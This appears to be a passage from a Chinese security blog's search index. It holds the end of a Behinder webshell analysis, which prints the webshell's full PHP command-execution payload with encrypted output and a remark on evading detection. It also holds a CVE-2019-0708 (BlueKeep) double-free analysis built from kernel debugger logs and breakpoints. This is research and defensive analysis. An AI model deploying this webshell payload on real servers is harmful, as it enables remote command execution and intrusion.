123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105@error_reporting(0);function getSafeStr($str)&#123; $s1 = iconv(&apos;utf-8&apos;,&apos;gbk//IGNORE&apos;,$str); $s0 = iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$s1); if($s0 == $str)&#123; return $s0; &#125;else&#123; return iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$str); &#125;&#125;function main($cmd)&#123; @set_time_limit(0); @ignore_user_abort(1); @ini_set(&apos;max_execution_time&apos;, 0); $result = array(); $PadtJn = @ini_get(&apos;disable_functions&apos;); if (! empty($PadtJn)) &#123; $PadtJn = preg_replace(&apos;/[, ]+/&apos;, &apos;,&apos;, $PadtJn); $PadtJn = explode(&apos;,&apos;, $PadtJn); $PadtJn = array_map(&apos;trim&apos;, $PadtJn); &#125; else &#123; $PadtJn = array(); &#125; $c = $cmd; if (FALSE !== strpos(strtolower(PHP_OS), &apos;win&apos;)) &#123; $c = $c . &quot; 2&gt;&amp;1\\n&quot;; &#125; $JueQDBH = &apos;is_callable&apos;; $Bvce = &apos;in_array&apos;; if ($JueQDBH(&apos;system&apos;) and ! $Bvce(&apos;system&apos;, $PadtJn)) &#123; ob_start(); system($c); $kWJW = ob_get_contents(); ob_end_clean(); &#125; else if ($JueQDBH(&apos;proc_open&apos;) and ! $Bvce(&apos;proc_open&apos;, $PadtJn)) &#123; $handle = proc_open($c, array( array( &apos;pipe&apos;, &apos;r&apos; ), array( &apos;pipe&apos;, &apos;w&apos; ), array( &apos;pipe&apos;, &apos;w&apos; ) ), $pipes); $kWJW = NULL; while (! feof($pipes[1])) &#123; $kWJW .= fread($pipes[1], 1024); &#125; @proc_close($handle); &#125; else if ($JueQDBH(&apos;passthru&apos;) and ! $Bvce(&apos;passthru&apos;, $PadtJn)) &#123; ob_start(); passthru($c); $kWJW = ob_get_contents(); ob_end_clean(); &#125; else if ($JueQDBH(&apos;shell_exec&apos;) and ! $Bvce(&apos;shell_exec&apos;, $PadtJn)) &#123; $kWJW = shell_exec($c); &#125; else if ($JueQDBH(&apos;exec&apos;) and ! $Bvce(&apos;exec&apos;, $PadtJn)) &#123; $kWJW = array(); exec($c, $kWJW); $kWJW = join(chr(10), $kWJW) . chr(10); &#125; else if ($JueQDBH(&apos;exec&apos;) and ! $Bvce(&apos;popen&apos;, $PadtJn)) &#123; $fp = popen($c, &apos;r&apos;); $kWJW = NULL; if (is_resource($fp)) &#123; while (! feof($fp)) &#123; $kWJW .= fread($fp, 1024); &#125; &#125; @pclose($fp); &#125; else &#123; $kWJW = 0; $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;); $result[&quot;msg&quot;] = base64_encode(&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;); $key = $_SESSION[&apos;k&apos;]; echo encrypt(json_encode($result), $key); return; &#125; $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode(getSafeStr($kWJW)); echo encrypt(json_encode($result), $_SESSION[&apos;k&apos;]);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&apos;openssl&apos;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;$cmd=&quot;whoami&quot;;main($cmd); 可以看到考虑了编码问题，还有一些执行命令的函数被禁用的问题 最后输出结构也是AES128加密的 工具每次只需倒数第二行的$cmd即可更换要执行的命令 总结攻防是不断对抗升级的，冰蝎虽然通信过程加密，但是请求密钥阶段有很多特征，假如将请求密钥阶段特征抹掉，那么我们防御端会更加难以检查。","categories":[],"tags":[{"name":"webshell","slug":"webshell","permalink":"https://www.giantbranch.cn/tags/webshell/"},{"name":"冰蝎","slug":"冰蝎","permalink":"https://www.giantbranch.cn/tags/冰蝎/"}]},{"title":"CVE-2019-0708 微软远程桌面服务远程代码执行漏洞之漏洞分析与漏洞利用","slug":"CVE-2019-0708 微软远程桌面服务远程代码执行漏洞之漏洞分析与漏洞利用","date":"2019-09-29T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2019/09/29/CVE-2019-0708 微软远程桌面服务远程代码执行漏洞之漏洞分析与漏洞利用/","link":"","permalink":"https://www.giantbranch.cn/2019/09/29/CVE-2019-0708 微软远程桌面服务远程代码执行漏洞之漏洞分析与漏洞利用/","excerpt":"","text":"前情回顾之前CVE-2019-0708补丁刚出来一天吧，就去分析补丁，进行了补丁对比，当时的分析把大家都给带偏了 CVE-2019-0708 微软远程桌面服务远程代码执行漏洞分析之补丁分析 现在来看，感觉自己当时是比较蠢了，既然只是针对MS_T120这个名字的Channel的_IcaBindChannel的第3个参数设置为31，而其他Channel没有写死，那么极大概率不是31这个参数可控不可控的问题了 当然后来也知道了31其实是Channel ID，而且这个是一个UAF漏洞，当然也可以说是Double Free（其实Double Free是UAF的特殊情况，因为这个USE是free而已） 漏洞简述因为MS_T120这个channel是内部Channel，MS_T120 Channel被绑定两次（内部绑定一次，然后我们又绑定一次——id不是31）。由于绑定的时候没有限制，所以绑定在两个不同的ID下，因此MS_T120 Channel就有两个引用，假如我们关闭channel，就触发一次free，而系统默认也会free，那就变成了Double Free了。 实验环境win 7 32位 旗舰版 漏洞分析发送POC 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149kd&gt; g*** Fatal System Error: 0x0000000a (0x00000000,0x00000002,0x00000001,0x840ED940)Break instruction exception - code 80000003 (first chance)A fatal system error has occurred.Debugger entered on first try; Bugcheck callbacks have not been invoked.A fatal system error has occurred.Connected to Windows 7 7600 x86 compatible target at (Sun Sep 29 16:59:07.622 2019 (UTC + 8:00)), ptr64 FALSELoading Kernel Symbols..............................................................................................................................................................Loading User Symbols....................................................................................Loading unloaded module list.........******************************************************************************** ** Bugcheck Analysis ** ********************************************************************************Use !analyze -v to get detailed debugging information.BugCheck A, &#123;0, 2, 1, 840ed940&#125;Probably caused by : termdd.sys ( termdd!_IcaFreeChannel+44 )Followup: MachineOwner---------nt!RtlpBreakWithStatusInstruction:840b2394 cc int 3kd&gt; !analyze -v******************************************************************************** ** Bugcheck Analysis ** ********************************************************************************IRQL_NOT_LESS_OR_EQUAL (a)An attempt was made to access a pageable (or completely invalid) address at aninterrupt request level (IRQL) that is too high. This is usuallycaused by drivers using improper addresses.If a kernel debugger is available get the stack backtrace.Arguments:Arg1: 00000000, memory referencedArg2: 00000002, IRQLArg3: 00000001, bitfield : bit 0 : value 0 = read operation, 1 = write operation bit 3 : value 0 = not an execute operation, 1 = execute operation (only on chips which support this level of status)Arg4: 840ed940, address which referenced memoryDebugging Details:------------------WRITE_ADDRESS: 00000000 CURRENT_IRQL: 2FAULTING_IP: nt!ExDeleteResourceLite+87840ed940 8901 mov dword ptr [ecx],eaxDEFAULT_BUCKET_ID: VISTA_DRIVER_FAULTBUGCHECK_STR: 0xAPROCESS_NAME: svchost.exeTRAP_FRAME: 90cc68ac -- (.trap 0xffffffff90cc68ac)ErrCode = 00000002eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=841b0280 edi=8a998884eip=840ed940 esp=90cc6920 ebp=90cc6934 iopl=0 nv up ei pl zr na pe nccs=0008 ss=0010 ds=0023 es=0023 fs=0030 gs=0000 efl=00010246nt!ExDeleteResourceLite+0x87:840ed940 8901 mov dword ptr [ecx],eax ds:0023:00000000=????????Resetting default scopeLAST_CONTROL_TRANSFER: from 84123e71 to 840b2394STACK_TEXT: 90cc6474 84123e71 00000003 8fa1ca4b 00000065 nt!RtlpBreakWithStatusInstruction90cc64c4 8412496d 00000003 00000000 840ed940 nt!KiBugCheckDebugBreak+0x1c90cc688c 8408d7eb 0000000a 00000000 00000002 nt!KeBugCheck2+0x68b90cc688c 840ed940 0000000a 00000000 00000002 nt!KiTrap0E+0x2cf90cc6934 90237da2 8a998884 868a7c98 8a998878 nt!ExDeleteResourceLite+0x8790cc6948 90238060 8a998878 8a998884 868b5670 termdd!_IcaFreeChannel+0x4490cc6964 9023895f 8a998878 868b5670 00000000 termdd!IcaDereferenceChannel+0x3490cc69a0 90239354 868b5670 00000005 0000001f termdd!IcaChannelInputInternal+0x3a790cc69c8 a60c5dc9 88cc2e24 00000005 0000001f termdd!IcaChannelInput+0x3c90cc6a00 a60c5e31 a6232008 88cc2e20 88cc2e10 RDPWD!SignalBrokenConnection+0x4090cc6a18 9023937f a5f73008 00000004 00000000 RDPWD!MCSIcaChannelInput+0x5590cc6a44 a609d436 88e14884 00000004 00000000 termdd!IcaChannelInput+0x6790cc726c a609d090 88e14880 88c525a8 840137a0 tssecsrv!CDefaultDataManager::Disconnect+0x3c90cc72a4 a609ca16 90cc72b4 88e14870 a60a0118 tssecsrv!CFilter::FilterIncomingData+0x22290cc72d0 9023c772 88c525a8 00000000 868a1cb4 tssecsrv!ScrRawInput+0x6090cc72f4 a60936a9 868195c4 00000000 868a1cb4 termdd!IcaRawInput+0x5a90cc7b30 9023b56d 868a1b68 8911f330 8844dc58 tdtcp!TdInputThread+0x34d90cc7b4c 9023b67c 89073800 00380173 8911f3a0 termdd!_IcaDriverThread+0x5390cc7b74 9023c00c 8844dc58 8911f330 868b5670 termdd!_IcaStartInputThread+0x6c90cc7bb4 90239e91 868b5670 8911f330 8911f3a0 termdd!IcaDeviceControlStack+0x50a90cc7be4 9023a065 8911f330 8911f3a0 88f3ce68 termdd!IcaDeviceControl+0x5990cc7bfc 840834bc 87c0cbb0 8911f330 8911f330 termdd!IcaDispatch+0x13f90cc7c14 84284eee 88f3ce68 8911f330 8911f3a0 nt!IofCallDriver+0x6390cc7c34 842a1cd1 87c0cbb0 88f3ce68 00000000 nt!IopSynchronousServiceTail+0x1f890cc7cd0 842a44ac 87c0cbb0 8911f330 00000000 nt!IopXxxControlFile+0x6aa90cc7d04 8408a42a 0000096c 00000000 00000000 nt!NtDeviceIoControlFile+0x2a90cc7d04 776b64f4 0000096c 00000000 00000000 nt!KiFastCallEntry+0x12a031cfc4c 776b4cac 6f5b18a7 0000096c 00000000 ntdll!KiFastSystemCallRet031cfc50 6f5b18a7 0000096c 00000000 00000000 ntdll!NtDeviceIoControlFile+0xc031cfc8c 6f5b25e9 0000096c 00380173 0037f0e0 ICAAPI!IcaIoControl+0x29031cfcbc 77811174 80000000 031cfd08 776cb3f5 ICAAPI!IcaInputThreadUserMode+0x37031cfcc8 776cb3f5 0037f0d8 74694ddb 00000000 kernel32!BaseThreadInitThunk+0xe031cfd08 776cb3c8 6f5b25b2 0037f0d8 00000000 ntdll!__RtlUserThreadStart+0x70031cfd20 00000000 6f5b25b2 0037f0d8 00000000 ntdll!_RtlUserThreadStart+0x1bSTACK_COMMAND: kbFOLLOWUP_IP: termdd!_IcaFreeChannel+4490237da2 8d4644 lea eax,[esi+44h]SYMBOL_STACK_INDEX: 5SYMBOL_NAME: termdd!_IcaFreeChannel+44FOLLOWUP_NAME: MachineOwnerMODULE_NAME: termddIMAGE_NAME: termdd.sysDEBUG_FLR_IMAGE_TIMESTAMP: 4a5bcadfFAILURE_BUCKET_ID: 0xA_termdd!_IcaFreeChannel+44BUCKET_ID: 0xA_termdd!_IcaFreeChannel+44Followup: MachineOwner--------- 可以看到是termdd!_IcaFreeChannel调用nt!ExDeleteResourceLite后崩溃了 在free的时候崩溃，那么很有可能就是double free了 在IcaRebindVirtualChannels和IcaBindVirtualChannels中我们都可以看到IcaFindChannelByName函数，我们看看这个函数， 1234567891011121314151617181920212223242526272829int __stdcall IcaFindChannelByName(int a1, int a2, char *a3)&#123; int v4; // ebx _DWORD *v5; // esi int v6; // edi if ( a2 != 5 ) return IcaFindChannel(a1, a2, 0); IcaLockChannelTable(a1 + 272); v4 = a1 + 80; v5 = *(_DWORD **)(a1 + 80); if ( v5 == (_DWORD *)(a1 + 80) ) goto LABEL_14; do &#123; v6 = (int)(v5 - 40); if ( *(v5 - 4) == 5 &amp;&amp; !__stricmp((const char *)(v6 + 0x94), a3) ) //通过这个我们知道channelname是在0x94偏移 break; v5 = (_DWORD *)*v5; &#125; while ( v5 != (_DWORD *)v4 ); if ( v5 != (_DWORD *)v4 ) _InterlockedExchangeAdd((volatile signed __int32 *)(v6 + 8), 1u); elseLABEL_14: v6 = 0; IcaUnlockChannelTable(a1 + 272); return v6;&#125; 通过这一行，我们可以看到free的地址是8a998878 190cc6948 90238060 8a998878 8a998884 868b5670 termdd!_IcaFreeChannel+0x44 看看channel name是不是MS_T120（0x94这个便宜系统不同，应该不一样的） 12kd&gt; da 8a998878+0x94 8a99890c &quot;MS_T120&quot; 可以看到确实是的，我们现在还不能完全确认是MS_T120 channel的UAF。 要进入步确认我们就需要看看这个MS_T120 channel实在哪里创建，是不是释放了两次 现在free函数已经知道了，那么申请内存的函数呢？ 我们看看有哪些函数调用了IcaFindChannelByName 可以看到有一个IcaCreateChannel函数，很可能就是创建Channel，申请内存的函数，我们跟过去，又发现一个_IcaAllocateChannel 进去看看，看到申请的函数了，就是它了 那我们下两个记录断点（这个需要查看汇编，看看ExAllocatePoolWithTag的返回值，还有_IcaFreeChannel的参数） 12bu termdd!_IcaAllocateChannel+0x1c &quot;.printf \\&quot;AllocateChannel Addresss: 0x%x\\n\\&quot;,@eax;.echo;gc&quot;bu termdd!_IcaFreeChannel &quot;.printf \\&quot;FreeChannel Addresss: 0x%x\\n\\&quot;,@esi;.echo;gc&quot; 再发送poc 发送payload 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758AllocateChannel Addresss: 0x88eecf38 AllocateChannel Addresss: 0x892b4df0 AllocateChannel Addresss: 0x86a10d08 AllocateChannel Addresss: 0x87c63688 AllocateChannel Addresss: 0x88f6e1a8 AllocateChannel Addresss: 0x892b4818 FreeChannel Addresss: 0x88eecf38 FreeChannel Addresss: 0x88f6e1a8 FreeChannel Addresss: 0x892b4818 FreeChannel Addresss: 0x87c63688 FreeChannel Addresss: 0x86a10d08 FreeChannel Addresss: 0x892b4df0 AllocateChannel Addresss: 0x88f6e1a8 AllocateChannel Addresss: 0x892bfc10 AllocateChannel Addresss: 0x88eecf38 AllocateChannel Addresss: 0x87c63688 AllocateChannel Addresss: 0x892b4df0 AllocateChannel Addresss: 0x86a95c50 FreeChannel Addresss: 0x88f6e1a8 FreeChannel Addresss: 0x88f6e1a8 *** Fatal System Error: 0x0000000a (0x00000000,0x00000002,0x00000001,0x840ED940)Break instruction exception - code 80000003 (first chance)A fatal system error has occurred.Debugger entered on first try; Bugcheck callbacks have not been invoked.A fatal system error has occurred.Connected to Windows 7 7600 x86 compatible target at (Fri Sep 27 15:29:54.017 2019 (UTC + 8:00)), ptr64 FALSELoading Kernel Symbols.............................................................................................................................................................Loading User Symbols....................................................................................Loading unloaded module list......******************************************************************************** ** Bugcheck Analysis ** ********************************************************************************Use !analyze -v to get detailed debugging information.BugCheck A, &#123;0, 2, 1, 840ed940&#125;Probably caused by : termdd.sys ( termdd!_IcaFreeChannel+44 )Followup: MachineOwner---------nt!RtlpBreakWithStatusInstruction:840b2394 cc int 3 我们看到，对0x88f6e1a8这个地址free了两次 12FreeChannel Addresss: 0x88f6e1a8 FreeChannel Addresss: 0x88f6e1a8 那就完全确认这个是UAF，也可以说是DOUBLE FREE（2 free） 在上面的基础，我们再下一个断点，看看是否同一个channel绑定了两个ID 1bu termdd!_IcaBindChannel &quot;.echo _IcaBindChannel ==================;kv;gc&quot; 我已经把垃圾信息过滤了，日志如下： 123456789101112131415161718192021222324252627282930313233343536kd&gt; gAllocateChannel Addresss: 0x88fd5738 _IcaBindChannel ==================ChildEBP RetAddr Args to Child a52c99e0 90238be9 88fd5738 00000005 0000001f termdd!_IcaBindChannel (FPO: [Non-Fpo])a52c9a04 90238d5e 8b1788e9 00000005 891282a7 termdd!_IcaAllocateChannel+0xf1 (FPO: [Non-Fpo])a52c9a28 90240177 88f9b6b0 00000005 88b89648 termdd!IcaCreateChannel+0x6c (FPO: [Non-Fpo])a52c9a58 9023a019 88b89648 88b896b8 869454d0 termdd!IcaCreate+0x13d (FPO: [Non-Fpo])a52c9a70 840834bc 87c0cbb0 88b89648 8694552c termdd!IcaDispatch+0xf3 (FPO: [Non-Fpo])a52c9a88 8428762d ba4135ef a52c9c30 00000000 nt!IofCallDriver+0x63a52c9b60 842681d7 87c0cbb0 a57ff6e0 87bf5858 nt!IopParseDevice+0xed7a52c9bdc 8428e24d 00000000 a52c9c30 00000040 nt!ObpLookupObjectName+0x4faa52c9c38 842865ab 013ae714 867ff6e0 a52c9c01 nt!ObOpenObjectByName+0x159a52c9cb4 84291eb6 03251114 c0100000 013ae714 nt!IopCreateFile+0x673a52c9d00 8408a42a 03251114 c0100000 013ae714 nt!NtCreateFile+0x34a52c9d00 776b64f4 03251114 c0100000 013ae714 nt!KiFastCallEntry+0x12a (FPO: [0,3] TrapFrame @ a52c9d34).................._IcaBindChannel ==================ChildEBP RetAddr Args to Child a52c9960 9023949b 88fd5738 00000005 00000003 termdd!_IcaBindChannel (FPO: [Non-Fpo])a52c9b74 9023bf90 86818670 88f17708 86818670 termdd!IcaBindVirtualChannels+0x101 (FPO: [Non-Fpo])a52c9bb4 90239e91 86818670 88f17708 88f17778 termdd!IcaDeviceControlStack+0x48e (FPO: [Non-Fpo])a52c9be4 9023a065 88f17708 88f17778 89187758 termdd!IcaDeviceControl+0x59 (FPO: [Non-Fpo])a52c9bfc 840834bc 87c0cbb0 88f17708 88f17708 termdd!IcaDispatch+0x13f (FPO: [Non-Fpo])a52c9c14 84284eee 89187758 88f17708 88f17778 nt!IofCallDriver+0x63a52c9c34 842a1cd1 87c0cbb0 89187758 00000000 nt!IopSynchronousServiceTail+0x1f8a52c9cd0 842a44ac 87c0cbb0 88f17708 00000000 nt!IopXxxControlFile+0x6aaa52c9d04 8408a42a 00000840 00000000 00000000 nt!NtDeviceIoControlFile+0x2aa52c9d04 776b64f4 00000840 00000000 00000000 nt!KiFastCallEntry+0x12a (FPO: [0,3] TrapFrame @ a52c9d34)..................FreeChannel Addresss: 0x88fd5738 FreeChannel Addresss: 0x88fd5738 我们首先确定0x88fd5738这个地址的channel是不是MS_T120 12kd&gt; da 0x88fd5738+0x9488fd57cc &quot;MS_T120&quot; 再看看termdd!_IcaBindChannel 的栈，针对的都是88fd5738这个地址，但是我们看第3个参数第一次是0x1f（其实就是十进制的31），而第二次是03，那就明显看到将同一个channel绑定了两个ID，导致有了两个引用，所以修复的时候强制指定为31，不管你绑定多少次，ID都是31 123a52c99e0 90238be9 88fd5738 00000005 0000001f termdd!_IcaBindChannel (FPO: [Non-Fpo])a52c9960 9023949b 88fd5738 00000005 00000003 termdd!_IcaBindChannel (FPO: [Non-Fpo]) 最后我们再来看看他们调用栈的不同点 第一个调用栈，可以看到从NtCreateFile到termdd!IcaDispatch再到termdd!IcaCreateChannel，就是系统创建的这个channel，分配这个channel后进行了_IcaBindChannel操作 12345678910111213141516ChildEBP RetAddr Args to Child a52c99e0 90238be9 88fd5738 00000005 0000001f termdd!_IcaBindChannel (FPO: [Non-Fpo])a52c9a04 90238d5e 8b1788e9 00000005 891282a7 termdd!_IcaAllocateChannel+0xf1 (FPO: [Non-Fpo])a52c9a28 90240177 88f9b6b0 00000005 88b89648 termdd!IcaCreateChannel+0x6c (FPO: [Non-Fpo])a52c9a58 9023a019 88b89648 88b896b8 869454d0 termdd!IcaCreate+0x13d (FPO: [Non-Fpo])a52c9a70 840834bc 87c0cbb0 88b89648 8694552c termdd!IcaDispatch+0xf3 (FPO: [Non-Fpo])a52c9a88 8428762d ba4135ef a52c9c30 00000000 nt!IofCallDriver+0x63a52c9b60 842681d7 87c0cbb0 a57ff6e0 87bf5858 nt!IopParseDevice+0xed7a52c9bdc 8428e24d 00000000 a52c9c30 00000040 nt!ObpLookupObjectName+0x4faa52c9c38 842865ab 013ae714 867ff6e0 a52c9c01 nt!ObOpenObjectByName+0x159a52c9cb4 84291eb6 03251114 c0100000 013ae714 nt!IopCreateFile+0x673a52c9d00 8408a42a 03251114 c0100000 013ae714 nt!NtCreateFile+0x34a52c9d00 776b64f4 03251114 c0100000 013ae714 nt!KiFastCallEntry+0x12a (FPO: [0,3] TrapFrame @ a52c9d34).................. 而第二次明显是由我们触发的，termdd!IcaDeviceControl到termdd!IcaBindVirtualChannels 1234567891011121314ChildEBP RetAddr Args to Child a52c9960 9023949b 88fd5738 00000005 00000003 termdd!_IcaBindChannel (FPO: [Non-Fpo])a52c9b74 9023bf90 86818670 88f17708 86818670 termdd!IcaBindVirtualChannels+0x101 (FPO: [Non-Fpo])a52c9bb4 90239e91 86818670 88f17708 88f17778 termdd!IcaDeviceControlStack+0x48e (FPO: [Non-Fpo])a52c9be4 9023a065 88f17708 88f17778 89187758 termdd!IcaDeviceControl+0x59 (FPO: [Non-Fpo])a52c9bfc 840834bc 87c0cbb0 88f17708 88f17708 termdd!IcaDispatch+0x13f (FPO: [Non-Fpo])a52c9c14 84284eee 89187758 88f17708 88f17778 nt!IofCallDriver+0x63a52c9c34 842a1cd1 87c0cbb0 89187758 00000000 nt!IopSynchronousServiceTail+0x1f8a52c9cd0 842a44ac 87c0cbb0 88f17708 00000000 nt!IopXxxControlFile+0x6aaa52c9d04 8408a42a 00000840 00000000 00000000 nt!NtDeviceIoControlFile+0x2aa52c9d04 776b64f4 00000840 00000000 00000000 nt!KiFastCallEntry+0x12a (FPO: [0,3] TrapFrame @ a52c9d34).................. 那么到最后我们我们关闭连接，我们绑定的MS_T120 channel free了一次，系统自己再free一次，那就造成了double free了 可以看看最后两次free的调用栈，第一次我们主动释放了ID 为03的channel，第二次是我们关闭了连接导致的释放（ID为31），明显看到第二次的栈上有tssecsrv!CDefaultDataManager::Disconnect（由于多次调试，下面的跟上面的地址会不一样） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667FreeChannel Addresss: 0x88ca9d48 ChildEBP RetAddr Args to Child 8e653a10 90238060 88ca9d48 00000000 891e19a8 termdd!_IcaFreeChannel (FPO: [Non-Fpo])8e653a2c 90238949 88ca9d48 890a0670 00000000 termdd!IcaDereferenceChannel+0x34 (FPO: [Non-Fpo])8e653a68 90239354 890a0670 00000005 00000003 termdd!IcaChannelInputInternal+0x391 (FPO: [Non-Fpo])8e653a90 945be1cf 8a9fb0d4 00000005 00000003 termdd!IcaChannelInput+0x3c (FPO: [Non-Fpo])8e653ab0 945c1548 8a9fb0d4 00000005 00000003 RDPWD!WDICART_IcaChannelInputEx+0x1d (FPO: [Non-Fpo])8e654148 945bbe42 a41c3008 8a9e9682 00000014 RDPWD!WDW_OnDataReceived+0x240 (FPO: [Non-Fpo])8e654174 945bbbfd a41c38f0 a41e7134 00000000 RDPWD!SM_MCSSendDataCallback+0x19a (FPO: [Non-Fpo])8e6541cc 945bba64 00000027 8e654204 8a9e9674 RDPWD!HandleAllSendDataPDUs+0x115 (FPO: [Non-Fpo])8e6541e8 945d7958 00000027 8e654204 8a9fb0d0 RDPWD!RecognizeMCSFrame+0x32 (FPO: [Non-Fpo])8e654214 945be63f a41c3008 8a9e96a2 00000001 RDPWD!MCSIcaRawInputWorker+0x3b4 (FPO: [Non-Fpo])8e654228 9023c772 a41c3008 00000000 8a9e9674 RDPWD!WDLIB_MCSIcaRawInput+0x13 (FPO: [Non-Fpo])8e65424c 945af46d 8a95a0c4 00000000 8a9e9674 termdd!IcaRawInput+0x5a (FPO: [Non-Fpo])8e654264 945aef06 8a9e9674 0000002f 8a95a0c0 tssecsrv!CRawInputDM::PassDataToServer+0x2b (FPO: [Non-Fpo])8e6542a4 945aea16 8e6542b4 8a95a0b0 945b2118 tssecsrv!CFilter::FilterIncomingData+0x98 (FPO: [Non-Fpo])8e6542d0 9023c772 88c85050 00000000 8a9e9674 tssecsrv!ScrRawInput+0x60 (FPO: [Non-Fpo])8e6542f4 945a56a9 8918c284 00000000 8a9e9674 termdd!IcaRawInput+0x5a (FPO: [Non-Fpo])8e654b30 9023b56d 8a9e9528 88580158 8a981b68 tdtcp!TdInputThread+0x34d (FPO: [Non-Fpo])8e654b4c 9023b67c 8a9f5878 00380173 885801c8 termdd!_IcaDriverThread+0x53 (FPO: [Non-Fpo])8e654b74 9023c00c 8a981b68 88580158 890a0670 termdd!_IcaStartInputThread+0x6c (FPO: [Non-Fpo])8e654bb4 90239e91 890a0670 88580158 885801c8 termdd!IcaDeviceControlStack+0x50a (FPO: [Non-Fpo])8e654be4 9023a065 88580158 885801c8 890a1360 termdd!IcaDeviceControl+0x59 (FPO: [Non-Fpo])8e654bfc 840834bc 87c0cbb0 88580158 88580158 termdd!IcaDispatch+0x13f (FPO: [Non-Fpo])8e654c14 84284eee 890a1360 88580158 885801c8 nt!IofCallDriver+0x638e654c34 842a1cd1 87c0cbb0 890a1360 00000000 nt!IopSynchronousServiceTail+0x1f88e654cd0 842a44ac 87c0cbb0 88580158 00000000 nt!IopXxxControlFile+0x6aa8e654d04 8408a42a 000007f4 00000000 00000000 nt!NtDeviceIoControlFile+0x2a8e654d04 776b64f4 000007f4 00000000 00000000 nt!KiFastCallEntry+0x12a (FPO: [0,3] TrapFrame @ 8e654d34)037af99c 776b4cac 6f5b18a7 000007f4 00000000 ntdll!KiFastSystemCallRet (FPO: [0,0,0])037af9a0 6f5b18a7 000007f4 00000000 00000000 ntdll!NtDeviceIoControlFile+0xc (FPO: [10,0,0])037af9dc 6f5b25e9 000007f4 00380173 029916f8 ICAAPI!IcaIoControl+0x29 (FPO: [Non-Fpo])037afa0c 77811174 80000000 037afa58 776cb3f5 ICAAPI!IcaInputThreadUserMode+0x37 (FPO: [Non-Fpo])037afa18 776cb3f5 029916f0 740f4a8b 00000000 kernel32!BaseThreadInitThunk+0xe (FPO: [Non-Fpo])037afa58 776cb3c8 6f5b25b2 029916f0 00000000 ntdll!__RtlUserThreadStart+0x70 (FPO: [Non-Fpo])037afa70 00000000 6f5b25b2 029916f0 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])FreeChannel Addresss: 0x88ca9d48 ChildEBP RetAddr Args to Child 8e653948 90238060 88ca9d48 88ca9d54 890a0670 termdd!_IcaFreeChannel (FPO: [Non-Fpo])8e653964 9023895f 88ca9d48 890a0670 00000000 termdd!IcaDereferenceChannel+0x34 (FPO: [Non-Fpo])8e6539a0 90239354 890a0670 00000005 0000001f termdd!IcaChannelInputInternal+0x3a7 (FPO: [Non-Fpo])8e6539c8 945d7dc9 8a9fb0d4 00000005 0000001f termdd!IcaChannelInput+0x3c (FPO: [Non-Fpo])8e653a00 945d7e31 a41e7008 8a9fb0d0 8a9fb0c0 RDPWD!SignalBrokenConnection+0x40 (FPO: [Non-Fpo])8e653a18 9023937f a41c3008 00000004 00000000 RDPWD!MCSIcaChannelInput+0x55 (FPO: [Non-Fpo])8e653a44 945af436 8a95a0c4 00000004 00000000 termdd!IcaChannelInput+0x67 (FPO: [Non-Fpo])8e65426c 945af090 8a95a0c0 88c85050 840137a0 tssecsrv!CDefaultDataManager::Disconnect+0x3c (FPO: [Non-Fpo])8e6542a4 945aea16 8e6542b4 8a95a0b0 945b2118 tssecsrv!CFilter::FilterIncomingData+0x222 (FPO: [Non-Fpo])8e6542d0 9023c772 88c85050 00000000 8a9e9674 tssecsrv!ScrRawInput+0x60 (FPO: [Non-Fpo])8e6542f4 945a56a9 8918c284 00000000 8a9e9674 termdd!IcaRawInput+0x5a (FPO: [Non-Fpo])8e654b30 9023b56d 8a9e9528 88580158 8a981b68 tdtcp!TdInputThread+0x34d (FPO: [Non-Fpo])8e654b4c 9023b67c 8a9f5878 00380173 885801c8 termdd!_IcaDriverThread+0x53 (FPO: [Non-Fpo])8e654b74 9023c00c 8a981b68 88580158 890a0670 termdd!_IcaStartInputThread+0x6c (FPO: [Non-Fpo])8e654bb4 90239e91 890a0670 88580158 885801c8 termdd!IcaDeviceControlStack+0x50a (FPO: [Non-Fpo])8e654be4 9023a065 88580158 885801c8 890a1360 termdd!IcaDeviceControl+0x59 (FPO: [Non-Fpo])8e654bfc 840834bc 87c0cbb0 88580158 88580158 termdd!IcaDispatch+0x13f (FPO: [Non-Fpo])8e654c14 84284eee 890a1360 88580158 885801c8 nt!IofCallDriver+0x638e654c34 842a1cd1 87c0cbb0 890a1360 00000000 nt!IopSynchronousServiceTail+0x1f88e654cd0 842a44ac 87c0cbb0 88580158 00000000 nt!IopXxxControlFile+0x6aa8e654d04 8408a42a 000007f4 00000000 00000000 nt!NtDeviceIoControlFile+0x2a8e654d04 776b64f4 000007f4 00000000 00000000 nt!KiFastCallEntry+0x12a (FPO: [0,3] TrapFrame @ 8e654d34)037af99c 776b4cac 6f5b18a7 000007f4 00000000 ntdll!KiFastSystemCallRet (FPO: [0,0,0])037af9a0 6f5b18a7 000007f4 00000000 00000000 ntdll!NtDeviceIoControlFile+0xc (FPO: [10,0,0])037af9dc 6f5b25e9 000007f4 00380173 029916f8 ICAAPI!IcaIoControl+0x29 (FPO: [Non-Fpo])037afa0c 77811174 80000000 037afa58 776cb3f5 ICAAPI!IcaInputThreadUserMode+0x37 (FPO: [Non-Fpo])037afa18 776cb3f5 029916f0 740f4a8b 00000000 kernel32!BaseThreadInitThunk+0xe (FPO: [Non-Fpo])037afa58 776cb3c8 6f5b25b2 029916f0 00000000 ntdll!__RtlUserThreadStart+0x70 (FPO: [Non-Fpo])037afa70 00000000 6f5b25b2 029916f0 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: 